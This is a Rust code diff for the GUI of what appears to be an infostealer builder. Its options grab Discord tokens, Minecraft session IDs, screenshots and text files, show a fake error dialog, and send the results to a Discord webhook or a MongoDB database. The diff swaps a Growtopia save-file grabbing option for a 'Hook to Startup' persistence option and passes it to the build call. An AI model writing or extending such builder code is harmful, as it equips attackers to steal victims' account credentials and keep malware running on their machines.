@@ -17,7 +17,7 @@ struct App {
     screenshot_desktop: bool,
     discord_token: bool,
     minecraft_ssid: bool,
-    growtopia_save_dat: bool,
+    hook_to_startup: bool,
 
     mongodb: bool,
     mongodb_uri: String,
@@ -39,7 +39,7 @@ enum Message {
     ToggleScreenshotDesktop(bool),
     ToggleDiscordToken(bool),
     ToggleMinecraftSsid(bool),
-    ToggleGrowtopiaSaveDat(bool),
+    ToggleHookToStartup(bool),
     ToggleMongoDB(bool),
     ChangeMongoDBUri(String),
 
@@ -84,8 +84,8 @@ impl App {
             Message::ToggleMinecraftSsid(toggle) => {
                 self.minecraft_ssid = toggle;
             }
-            Message::ToggleGrowtopiaSaveDat(toggle) => {
-                self.growtopia_save_dat = toggle;
+            Message::ToggleHookToStartup(toggle) => {
+                self.hook_to_startup = toggle;
             }
             Message::ToggleMongoDB(toggle) => {
                 self.mongodb = toggle;
@@ -109,6 +109,7 @@ impl App {
                     self.txt_files,
                     self.discord_token,
                     self.fake_error,
+                    self.hook_to_startup,
                     self.fe_title.as_mut_str(),
                     self.fe_msg.as_mut_str(),
                     self.webhook_uri.clone(),
@@ -198,10 +199,10 @@ impl App {
                     .label("Minecraft Ssid")
                     .text_size(12.0)
                     .on_toggle(Message::ToggleMinecraftSsid),
-                checkbox(self.growtopia_save_dat)
-                    .label("Growtopia Save Dat")
+                checkbox(self.hook_to_startup)
+                    .label("Hook to Startup")
                     .text_size(12.0)
-                    .on_toggle(Message::ToggleGrowtopiaSaveDat),
+                    .on_toggle(Message::ToggleHookToStartup),
                 text_input("Discord Webhook URL", &self.webhook_uri)
                     .on_input(Message::ChangeWebhookUri)
                     .width(200.0)
